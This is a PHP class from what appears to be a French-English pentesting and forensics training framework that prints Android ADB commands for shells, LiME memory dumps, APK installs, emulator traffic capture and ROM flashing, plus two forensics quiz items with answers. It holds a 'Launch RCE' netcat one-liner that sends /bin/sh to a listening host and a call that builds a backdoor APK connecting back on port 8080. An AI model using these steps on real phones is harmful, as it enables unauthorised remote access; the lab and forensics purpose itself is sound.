<?php


/*
 What hashing method is used to password protect Blackberry devices?
 A. AES
 B. RC5
 C. MD5
 D. SHA-1
 Correct Answer: D


 What must an investigator do before disconnecting an iPod from any type of computer?
 A. Unmount the iPod
 B. Mount the iPod
 C. Disjoin the iPod
 D. Join the iPod
 Correct Answer: A

 */



class android extends mobile{
	var $device_name;


	public function __construct($device) {
		$device = trim($device);
		parent::__construct($device);
		$this->device_name = basename($device);
	}




function android_remote_device_connect(){
	$this->titre("for Phone");
	$this->cmd("Mobile","Settings > About Phone and tapping on the Build Number multiple times.");
	$this->cmd("Mobile","Settings -> Developer options. Then we can enable USB debugging.");
	$this->requette("idevicepair pair");$this->pause();
	//ERROR: Could not validate with device 3e66f3d96ada57fce2060a1aeaf400e7460a2985 because a passcode is set. Please enter the passcode on the device and retry.
	//rohff@labs:~$ idevicepair pair
	//SUCCESS: Paired with device 3e66f3d96ada57fce2060a1aeaf400e7460a2985
	$this->requette("adb devices");$this->pause();
	// adb server is out of date. killing...
	// daemon started successfully *
	// List of devices attached
	// emulator-5554 device
	$this->requette(" adb devices -l");$this->pause();
	$this->requette("adb help");$this->pause();
	$this->ssTitre("GET SHELL");
 	$this->cmd("localhost","adb shell");
 	$this->cmd("shell@PGN611:/"," $ cat /proc/version");
 	//Linux version 3.18.19 (android@BIANYI-9) (gcc version 4.9.x-google 20140827 (prerelease) (GCC) ) #1 SMP PREEMPT Tue Nov 29 07:16:11 CST 2016
 	

 	$this->article("adb pull [repertoire sur le smartphone/nomduficher.format] [repertoire sur le pc]","Cette commande permet de transférer un fichier du smartphone au PC.");
    $this->article("adb push [repertoire sur le PC/nomduficher.format] [repertoire sur le smartphone]","Cette commande permet de transférer un fichier du PC au smartphone.");
 	$this->article("adb install android-app.apk","Ceci vous permet d'installer une application via son APK.");
 			
 	
 	$this->ssTitre("Memory Structure");
 	$this->cmd("shell@PGN611:/"," $ cat /proc/iomem");
 	$this->ssTitre("Memory Acquisition - Remote");
 	$this->cmd("localhost","adb push lime_ram.ko /sdcard/lime_ram.ko");
 	$this->cmd("localhost","adb forward tcp:4444 rcp:4444");
 	$this->cmd("localhost","adb shell");
 	$this->cmd("shell@PGN611:/","su");
 	$this->cmd("shell@PGN611:/","insmod /sdcard/lime_ram.ko \"path=tcp:4444 format=lime\" ");
 	$this->cmd("localhost","nc localhost 4444 > ram.lime ");
 	
 	$this->ssTitre("Memory Acquisition - Local");
 	$this->cmd("localhost","adb push lime_ram.ko /sdcard/lime_ram.ko ");
 	$this->cmd("localhost","adb shell");
 	$this->cmd("shell@PGN611:/","su");
 	$this->cmd("shell@PGN611:/","insmod /sdcard/lime_ram.ko \"path=/sdcard/dump_ram.lime format=lime\" ");
 	
	$this->ssTitre("Launch RCE");
	$this->cmd("localhost","~/android-sdks/platform-tools/adb -s WWLNHUONKZGM759L shell netstat -tupan");
	$this->ssTitre("Install APK File");
 	$this->cmd("localhost","~/android-sdks/platform-tools/adb -s WWLNHUONKZGM759L install '$this->dir_tools/mobile/HelloWorld.apk' ");
 	$this->ssTitre("Download any File");
 	$this->cmd("localhost","adb pull /data/app/[.apk file] [location]");
 	$this->pause();
 	$this->ssTitre("Interact With Framwork");
 	$this->cmd("shell@PGN611:/","services -h");
 	$this->cmd("shell@PGN611:/","services list");
 	$this->cmd("shell@PGN611:/","services call statusbar 1");
 	$this->cmd("shell@PGN611:/","services call statusbar 2");
 	$this->cmd("shell@PGN611:/","services call statusbar s16 bluetooth i32 1");
 	$this->cmd("shell@PGN611:/","services call statusbar s16 bluetooth i32 0");
 	$this->cmd("shell@PGN611:/","services call statusbar s16 alarm_clock i32 1");
 	$this->cmd("shell@PGN611:/","am start -a android.intent.action.VIEW -d http://pentesting.eu");
 	$this->cmd("shell@PGN611:/","pm list packages -f");
 	$this->cmd("shell@PGN611:/","wm");
 	$this->cmd("shell@PGN611:/","svc");
 	$this->cmd("shell@PGN611:/","monkey");
 	$this->cmd("shell@PGN611:/","setprop");
 	$this->ssTitre("Debugging with gdb");
 	$this->cmd("localhost","gdbserver localhost:2345 service list");
 	$this->cmd("localhost","adb forward tcp:2345 tcp:2345");
 	//Process service created; pid = 7822
 	//Listening on port 2345
 	
 	
 	$this->pause();
 	
 	$this->titre("for Emulatore");
 	$this->ssTitre("List AVDs");
 	$this->cmd("localhost","~/android-sdks/tools/android list avds");
 	$this->ssTitre("Launch AVD");
 	$this->cmd("localhost","~/android-sdks/tools/android avd");

 	//Available Android Virtual Devices:
 	//Name: test1
 	//Device: Nexus 4 (Google)
 	//Path: /home/rohff/.android/avd/test1.avd
 	//Target: Android 6.0 (API level 23)
 	//Tag/ABI: google_apis/armeabi-v7a
 	//Skin: HVGA
 	//Sdcard: 4000M
 	
 	$this->requette("gedit /home/rohff/.android/avd/test1.avd/emulator-user.ini");
 	$this->ssTitre("Capture Traffic & Dynamic Analyse");
 	$this->cmd("localhost","~/android-sdks/tools/emulator -avd testARM -http-proxy $this->proxy_addr:$this->proxy_port -tcpdump out.pcap ");
 	$this->cmd("localhost","java -jar burpsuite_free_v1.5.jar");
 	$this->ssTitre("GET EMULATOR NAME");
 	$this->requette(" adb devices -l");$this->pause();
 	$this->ssTitre("GET SHELL");
 	$this->cmd("localhost","adb -s emulator-5554 shell");
 	$this->ssTitre("INSTALL APK File");
 	$this->cmd("localhost","cd ~/android-sdk-linux/tools/; adb -s emulator-5554 install '$this->dir_tools/mobile/HelloWorld.apk'");
 	$this->ssTitre("Launch RCE");
 	$this->cmd("localhost","~/android-sdks/platform-tools/adb -s emulator-5554 shell netstat -tupan");
 	$this->cmd("localhost","nc -l 6666 -v");
 	$this->cmd("localhost","~/android-sdks/platform-tools/adb -s emulator-5554 shell 'nc $this->prof 6666  -v < /bin/sh' ");
 	$this->pause();
	
}

function android_malware_apk(){
	$this->gtitre("backdoor under android");
	// ##########################   APK  #######################################################
	$backdoor_android = new malware4linux($this->prof,$this->prof, 8080,"$this->dir_tmp/backdoor_media_android.apk","");
	$backdoor_android->backdoor_media_android();
	$this->pause(); // 0 / 57	// thefatrat
	
}



public function android_install_rom(){
	$this->gtitre(__FUNCTION__);
	$this->ssTtitre("Backup");
	$this->cmd("localhost","adb backup -f FullBackupAPK.ab -apk -all");
	$this->cmd("localhost"," adb backup -all -f FullBackup.ab");
	$this->ssTtitre("Restore");
	$this->cmd("localhost","adb restore <chemin vers fichiers>\backup.ab");
	
	
	$this->pause();
	
	$this->article("Bootloader","Your bootloader is the lowest level of software on your phone, 
			running all the code that’s necessary to start your operating system. 
			Most bootloaders come locked, meaning you can’t flash custom recoveries or ROMs.
			Unlocking your bootloader doesn’t root your phone directly, but it does allow you to root and/or flash custom ROMs if you so desire.");
	$this->article("Recovery","Your recovery is the software on your phone that lets you make backups, flash ROMs, and perform other system-level tasks. 
			The default recovery on your phone can’t do much, but you can flash a custom recovery—like ClockworkMod or TWRP—after you’ve unlocked your bootloader that will give you much more control over your device. 
			This is often an integral part of the rooting process.");
	$this->article("Nandroid","From most third-party recovery modules, you can make backups of your phone called nandroid backups. 
			It’s essentially a system image of your phone: Everything exactly how it is right now. 
			That way, if you flash something that breaks your phone, you can just flash back to your most recent nandroid backup to return everything to normal. 
			This is different from using an app like Titanium Backup that just backs up apps and/or settings—nandroid backups backup the entire system as one image. 
			Titanium backups are best when switching between ROMs or phones.");
	$this->pause();
	$this->cmd("localhost","adb -s WWLNHUONKZGM759L push $this->dir_tools/mobile/miui_MIMIXGlobal_V8.5.4.0.MAHMIED_0178011bcd_6.0.zip /sdcard/miui_MIMIXGlobal_V8.5.4.0.MAHMIED_0178011bcd_6.0.zip");
	
	$this->ssTitre("Reboot from Recovery");
	$this->cmd("localhost","adb -s WWLNHUONKZGM759L push $this->dir_tools/mobile/SuperSU-v2.82-201705271822.zip /sdcard/SuperSU-v2.82-201705271822.zip");
	$this->cmd("localhost","adb reboot recovery");
	$this->note("Select the “Apply update from ADB” option");
	$this->cmd("localhost","adb -s WWLNHUONKZGM759L sideload /sdcard/SuperSU-v2.82-201705271822.zip ");
	$this->cmd("localhost","adb -s WWLNHUONKZGM759L sideload /sdcard/miui_MIMIXGlobal_V8.5.4.0.MAHMIED_0178011bcd_6.0.zip");
	$this->cmd("shell@PGN611:/","aller dans le menu Fastboot puis sélectionnez le Recovery");
	
	//
	//
	//
	$this->pause();
	
	$this->ssTitre("Recovery");
	$this->cmd("localhost","adb -s WWLNHUONKZGM759L push $this->dir_tools/mobile/twrp-3.1.1-0-condor.img /sdcard/twrp-3.1.1-0-condor.img");

	$this->cmd("localhost","adb reboot bootloader");
	$this->cmd("localhost","fastboot devices");
	//WWLNHUONKZGM759L	fastboot
	
	$this->cmd("localhost","fastboot flash recovery /sdcard/twrp-3.1.1-0-condor.img");
	$this->cmd("localhost","fastboot erase cache");
	
	$this->cmd("localhost","fastboot reboot");
	$this->pause();
	
	$this->cmd("localhost","");
	
	$this->article("","");
	$this->article("","");
	$this->article("","");
	$this->article("","");
	$this->article("","");

}


































}

?>